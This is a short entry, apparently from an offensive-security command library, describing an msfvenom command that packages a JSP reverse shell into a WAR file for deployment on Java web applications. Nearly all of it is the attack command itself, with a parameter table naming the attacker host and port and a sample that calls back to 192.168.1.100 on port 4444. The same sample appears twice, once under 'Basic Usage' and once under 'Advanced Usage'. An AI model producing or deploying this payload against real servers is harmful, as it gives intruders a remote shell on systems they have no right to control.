---
id: b698d2e5-c8f3-4b17-a626-0272d9aab969
name: generate-java-war-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f war >
  shell.war
output: null
created_at: '2023-04-06T03:56:24.923637+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Java
tags:
  - reverse-shell
  - war
  - web-shell
verified: true
validated: true
---

# Generate Java WAR Reverse Shell Payload

## Command

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f war > shell.war
```

## Description

Generates a WAR archive containing a JSP reverse shell for deployment on Java web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p java/jsp_shell_reverse_tcp | JSP reverse payload | Built-in |
| -f war | WAR archive format | Built-in |
| > shell.war | Save to shell.war | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f war > shell.war
```

### Advanced Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f war > shell.war
```

## Expected Output

shell.war archive (~1 KB) containing JSP; unzip to verify.

## Related

- [[commands/generate-java-jsp-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
